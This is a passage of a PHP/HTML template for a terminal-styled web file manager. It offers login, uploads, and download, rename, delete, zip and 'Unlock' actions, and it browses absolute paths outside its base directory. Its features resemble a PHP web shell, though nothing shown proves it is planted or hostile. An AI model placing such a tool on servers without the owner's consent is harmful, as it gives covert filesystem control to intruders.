                <div class="title"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 48 48" aria-hidden="true"><rect width="14" height="7" x="17" y="8" fill="#999"></rect><path fill="#666" d="M43,8H31v7h14v-5C45,8.895,44.105,8,43,8z"></path><path fill="#ccc" d="M5,8c-1.105,0-2,0.895-2,2v5h14V8H5z"></path><linearGradient id="u8UbA7GmcDgkSbOtELVhra_WbRVMGxHh74X_t2" x1="3.594" x2="44.679" y1="13.129" y2="39.145" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#4c4c4c"></stop><stop offset="1" stop-color="#343434"></stop></linearGradient><path fill="url(#u8UbA7GmcDgkSbOtELVhra_WbRVMGxHh74X_t2)" d="M45,13H3v25c0,1.105,0.895,2,2,2h38c1.105,0,2-0.895,2-2V13z"></path><path d="M10.889,18.729l-2.197,2.197c-0.352,0.352-0.352,0.924,0,1.276l4.271,4.271l-4.325,4.325c-0.352,0.352-0.352,0.924,0,1.276l2.197,2.197c0.353,0.352,0.924,0.352,1.276,0l7.16-7.161c0.352-0.352,0.352-0.924,0-1.276l-7.106-7.106C11.813,18.376,11.242,18.376,10.889,18.729z" opacity=".07"></path></svg> --zsh</div>
            </div>
            <div class="body">
                <div class="output" id="login-term-output">C:\> </div>
            </div>
        </div>
    </div>
    <!-- Confirm Reload terminal overlay (CMD-style) -->
    <div class="overlay-terminal" id="confirm-overlay" role="dialog" aria-modal="true" aria-label="Confirm Reload">
        <div class="terminal-modal" role="document">
            <div class="titlebar">
                <div class="traffic">
                    <span class="dot red"></span>
                    <span class="dot yellow"></span>
                    <span class="dot green"></span>
                </div>
                <div class="title"><span class="material-symbols-rounded" aria-hidden="true">cached</span> Confirm Reload</div>
                <button class="term-close" id="confirm-close-btn" title="Close" aria-label="Close"><span class="material-symbols-rounded" aria-hidden="true">cancel</span></button>
            </div>
            <div class="body">
                <div class="output" id="confirm-output">$ Resend this page? It may repeat the last action.</div>
                <div style="margin-top:12px; text-align:center;">
                    <button class="icon-action" id="btn-cancel-reload" type="button" title="Cancel"><span class="material-symbols-rounded">cancel</span></button>
                    <button class="icon-action icon-confirm" id="btn-resend-reload" type="button" title="Resend"><span class="material-symbols-rounded">cached</span></button>
                </div>
            </div>
        </div>
    </div>
    <!-- Terminal-style window chrome -->
    <div class="terminal-chrome">
        <div class="terminal-bar">
            <div class="traffic">
                <a class="term-action term-logout" href="?logout=1" title="Logout" aria-label="Logout" onclick="if(window.spawnConfirmWindow){window.spawnConfirmWindow({message:'Are you sure you want logout now?',anchor:this,onYes:function(){location.href=(document.querySelector('.term-action.term-logout')||{}).href||'?logout=1';},onNo:function(){}});}else{if(window.confirm('Are you sure you want logout now?')){location.href=(document.querySelector('.term-action.term-logout')||{}).href||'?logout=1';}} return false;"><span class="material-symbols-rounded" aria-hidden="true">cancel</span></a>
                <button class="term-action term-minimize" id="term-minimize" type="button" title="Hide" aria-label="Hide"><span class="material-symbols-rounded">horizontal_rule</span></button>
            </div>
        <div class="term-title"><span class="material-symbols-rounded">terminal</span>
            <?php
            // Absolute-style clickable Current path from root. All segments navigable via `abs`
            $curParts  = array_values(array_filter(explode(DIRECTORY_SEPARATOR, ltrim($currentDir, DIRECTORY_SEPARATOR)), 'strlen'));
            echo 'Current: ';
            $segmentsOut = [];
            for ($i = 0; $i < count($curParts); $i++) {
                $part = $curParts[$i];
                $absAccum = DIRECTORY_SEPARATOR . implode(DIRECTORY_SEPARATOR, array_slice($curParts, 0, $i + 1));
                $segmentsOut[] = '<a href="?os=' . h(urlencode($absAccum)) . '">' . h($part) . '</a>';
            }
            echo '<span class="path-root">/</span> ' . implode(' / ', $segmentsOut);
            ?>
        </div>
            <?php $relCurrent = (strpos($currentDir, $BASE_DIR) === 0) ? ltrim(substr($currentDir, strlen($BASE_DIR)), DIRECTORY_SEPARATOR) : ''; ?>
            <?php if ($isOutsideBase): ?>
                <a class="term-action term-new" href="?new=1&os=<?= h(urlencode($currentDir)) ?>" title="Add" data-label="Add"><span class="material-symbols-rounded">add_circle</span></a>
                <a class="term-action term-upload" href="?upload=1&os=<?= h(urlencode($currentDir)) ?>" title="Upload" data-label="Upload"><span class="material-symbols-rounded">file_upload</span></a>
                <a class="term-action term-reload" href="#" id="reload-trigger" title="Reload" data-label="Reload"><span class="material-symbols-rounded">refresh</span></a>
            <?php else: ?>
                <a class="term-action term-new" href="?new=1<?= $relCurrent !== '' ? '&d=' . h(urlencode($relCurrent)) : '' ?>" title="Add" data-label="Add"><span class="material-symbols-rounded">add_circle</span></a>
                <a class="term-action term-upload" href="?upload=1<?= $relCurrent !== '' ? '&d=' . h(urlencode($relCurrent)) : '' ?>" title="Upload" data-label="Upload"><span class="material-symbols-rounded">file_upload</span></a>
                <a class="term-action term-reload" href="#" id="reload-trigger" title="Reload" data-label="Reload"><span class="material-symbols-rounded">refresh</span></a>
            <?php endif; ?>
            <?php if (!empty($prevLink)): ?>
                <a class="term-action term-back" href="<?= h($prevLink) ?>" title="Back" data-label="Back"><span class="material-symbols-rounded">arrow_back</span></a>
            <?php endif; ?>
        </div>
        <div class="command-bar" style="display:flex; align-items:center; gap:8px; flex-wrap:nowrap;">
            <div class="command-pill" style="flex:1; min-width:0;">~ / <?= h(basename($currentDir)) ?> — zsh</div>
            <div class="search-bar">
                <div class="input-pill" style="flex:1; max-width:320px;">
                    <span class="material-symbols-rounded" style="font-size:18px;">search</span>
                    <input type="text" id="file-search-input" placeholder="Search…" autocomplete="off" aria-label="Search files or folders">
                </div>
                <button class="icon-action" id="file-search-btn" type="button" title="Search" aria-label="Search"><span class="material-symbols-rounded">search</span></button>
            </div>
        </div>
        <!-- Global upload status banner -->
        <div id="global-upload" aria-live="polite" style="max-width:1100px; margin:10px auto 0; padding:8px 12px; border:1px solid var(--border); border-radius:10px; background: rgba(10,12,16,0.22); backdrop-filter: blur(6px) saturate(120%); box-shadow: 0 10px 18px rgba(0,0,0,0.28); display:none;">
            <div class="line" style="font-size:12px; color:#cbd5e1; text-align:center;">
                <span class="pct">0%</span>
                <span class="sep">·</span>
                <span class="speed">0 MB/s</span>
                <span class="sep">·</span>
                <span class="eta">ETA: —</span>
                <span class="sep">·</span>
                <span class="size">Size: —</span>
            </div>
            <div class="bar-wrap" style="margin-top:6px; border:1px solid var(--border); border-radius:9999px; height:10px; background: rgba(255,255,255,.06); overflow:hidden;">
                <div class="bar" style="height:100%; width:0%; background: Chartreuse; transition: width .12s ease;"></div>
            </div>
        </div>
        
    </div>
    <!-- Inline uploader uses the built-in Upload popup template below -->

    <div class="container">
        <?php /* inline error/notice removed; errors are shown via popup only */ ?>

        <?php if ($canGoUp): ?>
            <?php if ($isOutsideBase): ?>
                <p class="go-up"><a href="?os=<?= h(urlencode($parent)) ?>"><span class="material-symbols-rounded">arrow_back</span> GO BACK</a></p>
            <?php else: ?>
                <?php $upRel = ltrim(str_replace($BASE_DIR . DIRECTORY_SEPARATOR, '', $parent), DIRECTORY_SEPARATOR); ?>
                <p class="go-up"><a href="?d=<?= h(urlencode($upRel)) ?>"><span class="material-symbols-rounded">arrow_back</span> GO BACK</a></p>
            <?php endif; ?>
        <?php endif; ?>

        <table>
            <thead>
                <tr>
                    
                    <th><span class="material-symbols-rounded th-icon">badge</span> Name</th>
                    <th class="muted"><span class="material-symbols-rounded th-icon">category</span> Type</th>
                    <th class="muted"><span class="material-symbols-rounded th-icon">straighten</span> Size</th>
                    <th class="muted"><span class="material-symbols-rounded th-icon">schedule</span> Modified</th>
                    <th><span class="material-symbols-rounded th-icon">tune</span> Actions</th>
                </tr>
            </thead>
        <tbody id="files-body">
            <?php
            foreach ($entries as $e) {
                if ($e === '.' || $e === '..') continue;
                if ($e === '.data') continue;
                $full = $currentDir . DIRECTORY_SEPARATOR . $e;
                $fullReal = @realpath($full) ?: $full;
                $secureReal = @realpath($SECURE_DIR) ?: $SECURE_DIR;
                if ($SECURE_DIR !== '' && $fullReal === $secureReal) { continue; }
                $rel = ltrim(str_replace($BASE_DIR . DIRECTORY_SEPARATOR, '', $full), DIRECTORY_SEPARATOR);
                $isDir = is_dir($full);
                $type = $isDir ? 'Directory' : 'File';
                $size = $isDir ? '-' : number_format((float)filesize($full));
                $mtime = date('Y-m-d H:i', (int)filemtime($full));
            echo '<tr>';
                // Selection checkbox
                if ($isOutsideBase) {
            
                } else {
            
                }
                // Choose icon based on type/extension
                $ext = strtolower(pathinfo($full, PATHINFO_EXTENSION));
                if ($isDir) {
                    $dirWritable = @is_writable($full);
                    $iconClass = $dirWritable ? 'ic-folder' : 'ic-folder readonly';
                    $icon = '<span class="material-symbols-rounded ' . $iconClass . '">folder</span>';
                    if ($isOutsideBase) {
                echo '<td class="name-cell"><a class="folder-link name-ellipsis" href="?os=' . h(urlencode($full)) . '" title="' . h($e) . '">' . $icon . ' ' . h($e) . '</a></td>';
                    } else {
                echo '<td class="name-cell"><a class="folder-link name-ellipsis" href="?d=' . h(urlencode($rel)) . '" title="' . h($e) . '">' . $icon . ' ' . h($e) . '</a></td>';
                    }
                } else {
                    if ($ext === 'zip') {
                        $icon = '<svg class="zip-icon" viewBox="0 0 24 24" role="img" aria-label="ZIP"><rect x="5" y="3" width="14" height="6" rx="2" fill="#8a2be2"/><rect x="5" y="9" width="14" height="6" rx="2" fill="#1e90ff"/><rect x="5" y="15" width="14" height="6" rx="2" fill="#32cd32"/><rect x="10.5" y="3" width="3" height="18" rx="1.5" fill="#cfa15c"/><rect x="10.5" y="9" width="3" height="2" rx="1" fill="#b6893f"/></svg>';
                    } elseif ($ext === 'txt') {
                        $icon = '<span class="material-symbols-rounded ic-txt">sticky_note_2</span>';
                    } elseif ($ext === 'php') {
                        $icon = '<i class="fa-brands fa-php ic-php"></i>';
                    } elseif ($ext === 'html' || $ext === 'htm') {
                        $icon = '<i class="fa-brands fa-html5 ic-html"></i>';
                    } elseif ($ext === 'js') {
                        $icon = '<i class="fa-brands fa-js ic-js"></i>';
                    } elseif ($ext === 'css') {
                        $icon = '<i class="fa-brands fa-css3 ic-css"></i>';
                    } elseif ($ext === 'py') {
                        $icon = '<i class="fa-brands fa-python ic-python"></i>';
                    } elseif (in_array($ext, ['mp3','wav','flac','m4a','aac','ogg','opus'], true)) {
                        $icon = '<span class="material-symbols-rounded ic-audio">audio_file</span>';
                    } elseif (in_array($ext, ['mp4','webm','mkv','mov','avi','wmv','mpg','mpeg','3gp','3gpp'], true)) {
                        $icon = '<span class="material-symbols-rounded ic-video">video_file</span>';
                    } elseif (in_array($ext, ['jpg','jpeg','png','gif','webp','bmp','svg'], true)) {
                        $icon = '<span class="material-symbols-rounded ic-image">image</span>';
                    } else {
                        $icon = '<span class="material-symbols-rounded ic-file">file_present</span>';
                    }
                echo '<td class="name-cell"><span class="name-ellipsis" title="' . h($e) . '">' . $icon . ' ' . h($e) . '</span></td>';
                }
                echo '<td class="muted">' . h($type) . '</td>';
                echo '<td class="muted">' . h($size) . '</td>';
                echo '<td class="modified">' . h($mtime) . '</td>';
                echo '<td class="actions">';
                if ($isOutsideBase) {
                    if ($isDir) {
                        // Absolute folder actions: Download, View, Rename, Delete, Zip, Unlock
                        echo '<a class="btn btn-icon" href="?download_abs=' . h(urlencode($full)) . '" aria-label="Download" title="Download" data-label="Download"><svg class="download-icon" xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="24" height="24" viewBox="0,0,256,256"><defs><linearGradient x1="17.334" y1="4.705" x2="29.492" y2="32.953" gradientUnits="userSpaceOnUse" id="color-1_VGQlJM067vkN_gr1"><stop offset="0" stop-color="#87ef32"></stop><stop offset="1" stop-color="#1ea2e4"></stop></linearGradient><linearGradient x1="39.761" y1="31.57" x2="43.605" y2="42.462" gradientUnits="userSpaceOnUse" id="color-2_VGQlJM067vkN_gr2"><stop offset="0" stop-color="#87ef32"></stop><stop offset="1" stop-color="#1ea2e4"></stop></linearGradient><linearGradient x1="9" y1="40" x2="39" y2="40" gradientUnits="userSpaceOnUse" id="color-3_VGQlJM067vkN_gr3"><stop offset="0" stop-color="#0362b0"></stop><stop offset="0.112" stop-color="#036abd"></stop><stop offset="0.258" stop-color="#036fc5"></stop><stop offset="0.5" stop-color="#0370c8"></stop><stop offset="0.742" stop-color="#036fc5"></stop><stop offset="0.888" stop-color="#036abd"></stop><stop offset="1" stop-color="#0362b0"></stop></linearGradient><linearGradient x1="8.239" y1="31.57" x2="4.395" y2="42.462" gradientUnits="userSpaceOnUse" id="color-4_VGQlJM067vkN_gr4"><stop offset="0" stop-color="#87ef32"></stop><stop offset="1" stop-color="#1ea2e4"></stop></linearGradient></defs><g fill="none" fill-rule="nonzero" stroke="none" stroke-width="1" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="10" stroke-dasharray="" stroke-dashoffset="0" font-family="none" font-weight="none" font-size="none" text-anchor="none" style="mix-blend-mode: normal"><g transform="scale(5.33333,5.33333)"><path d="M31.19,22h-4.19v-16c0,-0.552 -0.448,-1 -1,-1h-4c-0.552,0 -1,0.448 -1,1v16h-4.19c-0.72,0 -1.08,0.87 -0.571,1.379l6.701,6.701c0.586,0.586 1.536,0.586 2.121,0l6.701,-6.701c0.509,-0.509 0.148,-1.379 -0.572,-1.379z" fill="url(#color-1_VGQlJM067vkN_gr1)"></path><path d="M39,33v10l4.828,-4.828c0.75,-0.75 1.172,-1.768 1.172,-2.828v-2.344c0,-0.552 -0.448,-1 -1,-1h-4c-0.552,0 -1,0.448 -1,1z" fill="url(#color-2_VGQlJM067vkN_gr2)"></path><rect x="9" y="37" width="30" height="6" fill="url(#color-3_VGQlJM067vkN_gr3)"></rect><path d="M9,33v10l-4.828,-4.828c-0.751,-0.751 -1.172,-1.768 -1.172,-2.829v-2.343c0,-0.552 0.448,-1 1,-1h4c0.552,0 1,0.448 1,1z" fill="url(#color-4_VGQlJM067vkN_gr4)"></path></g></g></svg></a>';
            echo '<a class="btn btn-view" href="?os=' . h(urlencode($full)) . '" aria-label="View" title="View"><span class="material-symbols-rounded">folder_open</span> VIEW</a>';
            echo '<a class="btn btn-rename" href="?os=' . h(urlencode($full)) . '&rename_abs=1" title="Rename" aria-label="Rename"><svg class="rename-icon" xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="18" height="18" viewBox="0 0 48 48"><linearGradient id="Fly~vIrnzLNx4sqnHqi3Qa_B4pji8Bcxjff_gr1" x1="41" x2="5" y1="44" y2="44" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#fed100"></stop><stop offset="1" stop-color="#eb6001"></stop></linearGradient><path fill="url(#Fly~vIrnzLNx4sqnHqi3Qa_B4pji8Bcxjff_gr1)" d="M5,43h35c0.552,0,1,0.448,1,1l0,0c0,0.552-0.448,1-1,1H5V43z"></path><linearGradient id="Fly~vIrnzLNx4sqnHqi3Qb_B4pji8Bcxjff_gr2" x1="10.559" x2="36.15" y1="4.748" y2="30.339" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#ffd747"></stop><stop offset=".482" stop-color="#ffd645"></stop><stop offset="1" stop-color="#f5bc00"></stop></linearGradient><path fill="url(#Fly~vIrnzLNx4sqnHqi3Qb_B4pji8Bcxjff_gr2)" d="M44.419,14.798L33.203,3.581c-0.774-0.774-2.03-0.774-2.805,0L9,24.98L15,33l7.964,6 l21.455-21.398C45.194,16.828,45.194,15.572,44.419,14.798z"></path><linearGradient id="Fly~vIrnzLNx4sqnHqi3Qc_B4pji8Bcxjff_gr3" x1="5.083" x2="13.328" y1="34.215" y2="48.495" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#fed100"></stop><stop offset="1" stop-color="#e36001"></stop></linearGradient><path fill="url(#Fly~vIrnzLNx4sqnHqi3Qc_B4pji8Bcxjff_gr3)" d="M5,45c-0.521,0-1.032-0.204-1.414-0.586C3.021,43.849,2.846,43,3.188,42.143l4-10L13,35 l2.8,5.8L5.743,44.857C5.502,44.953,5.25,45,5,45z"></path><linearGradient id="Fly~vIrnzLNx4sqnHqi3Qd_B4pji8Bcxjff_gr4" x1="6.75" x2="20.75" y1="27.25" y2="41.25" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#889097"></stop><stop offset="1" stop-color="#4c5963"></stop></linearGradient><polygon fill="url(#Fly~vIrnzLNx4sqnHqi3Qd_B4pji8Bcxjff_gr4)" points="7.2,32.2 9,25 23,39 15.8,40.8"></polygon></svg> Rename</a>';
                        echo '<a class="btn btn-icon btn-danger" href="?os=' . h(urlencode($full)) . '&delete_abs=1" aria-label="Delete" title="Delete" data-label="Delete"><svg class="delete-icon" xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="24" height="24" viewBox="0,0,256,256"><defs><linearGradient x1="16" y1="2.888" x2="16" y2="29.012" gradientUnits="userSpaceOnUse" id="color-1_nTkpTS1GZpkb_gr1"><stop offset="0" stop-color="#8b0000"></stop><stop offset="0.247" stop-color="#8b0000"></stop><stop offset="0.672" stop-color="#8b0000"></stop><stop offset="1" stop-color="#8b0000"></stop></linearGradient><linearGradient x1="16" y1="10.755" x2="16" y2="21.245" gradientUnits="userSpaceOnUse" id="color-2_nTkpTS1GZpkb_gr2"><stop offset="0" stop-color="#000000" stop-opacity="0.1"></stop><stop offset="1" stop-color="#000000" stop-opacity="0.7"></stop></linearGradient><linearGradient x1="16" y1="3" x2="16" y2="29" gradientUnits="userSpaceOnUse" id="color-3_nTkpTS1GZpkb_gr3"><stop offset="0" stop-color="#000000" stop-opacity="0.02"></stop><stop offset="1" stop-color="#000000" stop-opacity="0.15"></stop></linearGradient></defs><g fill="none" fill-rule="nonzero" stroke="none" stroke-width="1" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="10" stroke-dasharray="" stroke-dashoffset="0" font-family="none" font-weight="none" font-size="none" text-anchor="none" style="mix-blend-mode: normal"><g transform="scale(8,8)"><circle cx="16" cy="16" r="13" fill="url(#color-1_nTkpTS1GZpkb_gr1)"></circle><g fill="url(#color-2_nTkpTS1GZpkb_gr2)" opacity="0.2"><path d="M19.995,10.755c-0.334,0 -0.648,0.13 -0.884,0.366l-3.111,3.111l-3.111,-3.111c-0.236,-0.236 -0.55,-0.366 -0.884,-0.366c-0.334,0 -0.648,0.13 -0.884,0.366c-0.487,0.487 -0.487,1.28 0,1.768l3.111,3.111l-3.111,3.111c-0.487,0.487 -0.487,1.28 0,1.768c0.236,0.236 0.55,0.366 0.884,0.366c0.334,0 0.648,-0.13 0.884,-0.366l3.111,-3.111l3.111,3.111c0.236,0.236 0.55,0.366 0.884,0.366c0.334,0 0.648,-0.13 0.884,-0.366c0.487,-0.487 0.487,-1.28 0,-1.768l-3.111,-3.111l3.111,-3.111c0.487,-0.487 0.487,-1.28 0,-1.768c-0.236,-0.236 -0.55,-0.366 -0.884,-0.366z"></path></g><path d="M16,3.25c7.03,0 12.75,5.72 12.75,12.75c0,7.03 -5.72,12.75 -12.75,12.75c-7.03,0 -12.75,-5.72 -12.75,-12.75c0,-7.03 5.72,-12.75 12.75,-12.75M16,3c-7.18,0 -13,5.82 -13,13c0,7.18 5.82,13 13,13c7.18,0 13,-5.82 13,-13c0,-7.18 -5.82,-13 -13,-13z" fill="url(#color-3_nTkpTS1GZpkb_gr3)"></path><path d="M17.414,16l3.288,-3.288c0.391,-0.391 0.391,-1.024 0,-1.414c-0.391,-0.391 -1.024,-0.391 -1.414,0l-3.288,3.288l-3.288,-3.288c-0.391,-0.391 -1.024,-0.391 -1.414,0c-0.391,0.391 -0.391,1.024 0,1.414l3.288,3.288l-3.288,3.288c-0.391,0.391 -0.391,1.024 0,1.414c0.391,0.391 1.024,0.391 1.414,0l3.288,-3.288l3.288,3.288c0.391,0.391 1.024,0.391 1.414,0c0.391,-0.391 0.391,-1.024 0,-1.414z" fill="#ffffff"></path></g></g></svg></a>';
            echo '<a class="btn btn-icon btn-zip" href="?os=' . h(urlencode($full)) . '&zip_abs=1" aria-label="Zip" title="Zip" data-label="Zip"><svg class="zip-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" role="img" aria-label="Zip"><linearGradient id="zip_btn_abs_gr1" x1="24" x2="24" y1="18" y2="30" gradientUnits="userSpaceOnUse"><stop offset=".233" stop-color="#41a5ee"></stop><stop offset=".317" stop-color="#3994de"></stop><stop offset=".562" stop-color="#2366b4"></stop><stop offset=".751" stop-color="#154a9b"></stop><stop offset=".86" stop-color="#103f91"></stop></linearGradient><rect width="36" height="12" x="6" y="18" fill="url(#zip_btn_abs_gr1)"></rect><linearGradient id="zip_btn_abs_gr2" x1="24" x2="24" y1="6" y2="18" gradientUnits="userSpaceOnUse"><stop offset=".233" stop-color="#e8457c"></stop><stop offset=".272" stop-color="#e14177"></stop><stop offset=".537" stop-color="#b32c59"></stop><stop offset=".742" stop-color="#971e46"></stop><stop offset=".86" stop-color="#8c193f"></stop></linearGradient><path fill="url(#zip_btn_abs_gr2)" d="M42,18H6V8c0-1.105,0.895-2,2-2h32c1.105,0,2,0.895,2,2V18z"></path><linearGradient id="zip_btn_abs_gr3" x1="24" x2="24" y1="30" y2="42" gradientUnits="userSpaceOnUse"><stop offset=".233" stop-color="#33c481"></stop><stop offset=".325" stop-color="#2eb173"></stop><stop offset=".566" stop-color="#228353"></stop><stop offset=".752" stop-color="#1b673f"></stop><stop offset=".86" stop-color="#185c37"></stop></linearGradient><path fill="url(#zip_btn_abs_gr3)" d="M40,42H8c-1.105,0-2-0.895-2-2V30h36v10C42,41.105,41.105,42,40,42z"></path><rect width="14" height="36" x="17" y="6" opacity=".05"></rect><rect width="13" height="36" x="17.5" y="6" opacity=".07"></rect><linearGradient id="zip_btn_abs_gr4" x1="24" x2="24" y1="6" y2="42" gradientUnits="userSpaceOnUse"><stop offset=".039" stop-color="#f8c819"></stop><stop offset=".282" stop-color="#af4316"></stop></linearGradient><rect width="12" height="36" x="18" y="6" fill="url(#zip_btn_abs_gr4)"></rect><linearGradient id="zip_btn_abs_gr5" x1="24" x2="24" y1="12" y2="42" gradientUnits="userSpaceOnUse"><stop offset="0" stop-color="#eaad29"></stop><stop offset=".245" stop-color="#d98e24"></stop><stop offset=".632" stop-color="#c0631c"></stop><stop offset=".828" stop-color="#b75219"></stop><stop offset=".871" stop-color="#a94917"></stop><stop offset=".949" stop-color="#943b13"></stop><stop offset="1" stop-color="#8c3612"></stop></linearGradient><path fill="url(#zip_btn_abs_gr5)" d="M24,12c-3.314,0-6,2.686-6,6v24h12V18C30,14.686,27.314,12,24,12z"></path><path d="M20,32c-0.73,0-1.41-0.2-2-0.55v1.14c0.61,0.26,1.29,0.41,2,0.41h8c0.71,0,1.39-0.15,2-0.41v-1.14 C29.41,31.8,28.73,32,28,32H20z M29,22v6c0,0.55-0.45,1-1,1h-2v-2c0-1.1-0.9-2-2-2s-2,0.9-2,2v2h-2c-0.55,0-1-0.45-1-1v-6 c0-0.55-0.45-1-1-1v7c0,1.1,0.9,2,2,2h3v-3c0-0.55,0.45-1,1-1s1,0.45,1,1v3h3c1.1,0,2-0.9,2-2v-7C29.45,21,29,21.45,29,22z" opacity=".05"></path><path d="M29.5,22v6c0,0.83-0.67,1.5-1.5,1.5h-2.5V27c0-0.83-0.67-1.5-1.5-1.5s-1.5,0.67-1.5,1.5v2.5H20 c-0.83,0-1.5-0.67-1.5-1.5v-6c0-0.28-0.22-0.5-0.5-0.5V28c0,1.1,0.9,2,2,2h3v-3c0-0.55,0.45-1,1-1s1,0.45,1,1v3h3c1.1,0,2-0.9,2-2 v-6.5C29.72,21.5,29.5,21.72,29.5,22z M20,32c-0.73,0-1.41-0.2-2-0.55v0.58c0.6,0.3,1.28,0.47,2,0.47h8c0.72,0,1.4-0.17,2-0.47 v-0.58C29.41,31.8,28.73,32,28,32H20z" opacity=".07"></path><linearGradient id="zip_btn_abs_gr6" x1="24" x2="24" y1="21" y2="32" gradientUnits="userSpaceOnUse"><stop offset=".613" stop-color="#e6e6e6"></stop><stop offset=".785" stop-color="#e4e4e4"></stop><stop offset=".857" stop-color="#ddd"></stop><stop offset=".91" stop-color="#d1d1d1"></stop><stop offset=".953" stop-color="#bfbfbf"></stop><stop offset=".967" stop-color="#b8b8b8"></stop></linearGradient><path fill="url(#zip_btn_abs_gr6)" d="M32,23v5c0,2.2-1.8,4-4,4h-8c-2.2,0-4-1.8-4-4v-5c0-1.105,0.895-2,2-2h0v7 c0,1.105,0.895,2,2,2h3v-3c0-0.552,0.448-1,1-1h0c0.552,0,1,0.448,1,1v3h3c1.105,0,2-0.895,2-2v-7C31.1,21,32,21.9,32,23z"></path></svg></a>';
            
                        // Unlock: posts do_unlock_abs with absolute directory
                        echo '<form method="post" style="display:inline">'
                            . '<input type="hidden" name="do_unlock_abs" value="1">'
                            . '<input type="hidden" name="os" value="' . h($full) . '">'
                            . '<button class="btn btn-icon btn-unlock" type="submit" title="Unlock" aria-label="Unlock" data-label="Unlock"><svg class="unlock-icon" xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" viewBox="0,0,256,256"><defs><linearGradient x1="37.817" y1="7.214" x2="10.183" y2="34.847" gradientUnits="userSpaceOnUse" id="color-1_4R1YVxksRVyW_gr1"><stop offset="0" stop-color="#fe6060"></stop><stop offset="0.033" stop-color="#fe6a6a"></stop><stop offset="0.197" stop-color="#fe9797"></stop><stop offset="0.362" stop-color="#ffbdbd"></stop><stop offset="0.525" stop-color="#ffdada"></stop><stop offset="0.687" stop-color="#ffeeee"></stop><stop offset="0.846" stop-color="#fbfffd"></stop><stop offset="1" stop-color="#ffffff"></stop></linearGradient></defs><g fill="none" fill-rule="nonzero" stroke="none" stroke-width="none" stroke-linecap="none" stroke-linejoin="none" stroke-miterlimit="10" stroke-dasharray="" stroke-dashoffset="0" font-family="none" font-weight="none" font-size="none" text-anchor="none" style="mix-blend-mode: normal"><g transform="scale(5.33333,5.33333)"><path d="M23.185,44.456c0.513,0.228 1.117,0.228 1.63,0c14.131,-6.28 16.685,-16.25 16.685,-22.388v-10.352c0,-1.047 -0.81,-1.897 -1.852,-1.991c-6.626,-0.592 -12.119,-4.19 -14.448,-5.949c-0.713,-0.538 -1.687,-0.538 -2.4,0c-2.329,1.759 -7.822,5.357 -14.448,5.949c-1.042,0.094 -1.852,0.944 -1.852,1.991v10.352c0,6.138 2.554,16.108 16.685,22.388z" fill="url(#color-1_4R1YVxksRVyW_gr1)" stroke="none" stroke-width="1" stroke-linecap="butt" stroke-linejoin="miter"></path><path d="M41.5,14.391v-1.984c0,-1.047 -0.81,-1.897 -1.852,-1.991c-6.626,-0.592 -12.119,-4.19 -14.448,-5.949c-0.713,-0.538 -1.687,-0.538 -2.4,0c-2.329,1.759 -7.822,5.357 -14.448,5.949c-1.042,0.094 -1.852,0.944 -1.852,1.991v9.81" fill="none" stroke="#e31010" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"></path><path d="M8.221,31.292c2.061,4.856 6.373,10.038 14.964,13.856c0.513,0.228 1.117,0.228 1.63,0c14.131,-6.281 16.685,-16.251 16.685,-22.389v-2.498" fill="none" stroke="#e31010" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"></path><path d="M20.946,32.5h-1.446c-1.657,0 -3,-1.343 -3,-3v-5c0,-1.657 1.343,-3 3,-3h9c1.657,0 3,1.343 3,3v5c0,1.657 -1.343,3 -3,3h-1.902" fill="none" stroke="#e31010" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"></path><circle cx="24" cy="27" r="2" fill="#e31010" stroke="none" stroke-width="1" stroke-linecap="butt" stroke-linejoin="miter"></circle><path d="M19.5,21.5v-3.5c0,-2.485 2.015,-4.5 4.5,-4.5v0c2.485,0 4.5,2.015 4.5,4.5v3.5" fill="none" stroke="#e31010" stroke-width="3" stroke-linecap="butt" stroke-linejoin="miter"></path></g></g></svg></button>'
                            . '</form>';
                    } else {
                        // Absolute file actions: Download, View for images, Edit otherwise, Rename, Delete, Unzip last for .zip
                        echo '<a class="btn btn-icon" href="?download_abs=' . h(urlencode($full)) . '" aria-label="Download" title="Download" data-label="Download"><svg class="download-icon" xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="24" height="24" viewBox="0,0,256,256"><defs><linearGradient x1="17.334" y1="4.705" x2="29.492" y2="32.953" gradientUnits="userSpaceOnUse" id="color-1_VGQlJM067vkN_gr1"><stop offset="0" stop-color="#87ef32"></stop><stop offset="1" stop-color="#1ea2e4"></stop></linearGradient><linearGradient x1="39.761" y1="31.57" x2="43.605" y2="42.462" gradientUnits="userSpaceOnUse" id="color-2_VGQlJM067vkN_gr2"><stop offset="0" stop-color="#87ef32"></stop><stop offset="1" stop-color="#1ea2e4"></stop></linearGradient><linearGradient x1="9" y1="40" x2="39" y2="40" gradientUnits="userSpaceOnUse" id="color-3_VGQlJM067vkN_gr3"><stop offset="0" stop-color="#0362b0"></stop><stop offset="0.112" stop-color="#036abd"></stop><stop offset="0.258" stop-color="#036fc5"></stop><stop offset="0.5" stop-color="#0370c8"></stop><stop offset="0.742" stop-color="#036fc5"></stop><stop offset="0.888" stop-color="#036abd"></stop><stop offset="1" stop-color="#0362b0"></stop></linearGradient><linearGradient x1="8.239" y1="31.57" x2="4.395" y2="42.462" gradientUnits="userSpaceOnUse" id="color-4_VGQlJM067vkN_gr4"><stop offset="0" stop-color="#87ef32"></stop><stop offset="1" stop-color="#1ea2e4"></stop></linearGradient></defs><g fill="none" fill-rule="nonzero" stroke="none" stroke-width="1" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="10" stroke-dasharray="" stroke-dashoffset="0" font-family="none" font-weight="none" font-size="none" text-anchor="none" style="mix-blend-mode: normal"><g transform="scale(5.33333,5.33333)"><path d="M31.19,22h-4.19v-16c0,-0.552 -0.448,-1 -1,-1h-4c-0.552,0 -1,0.448 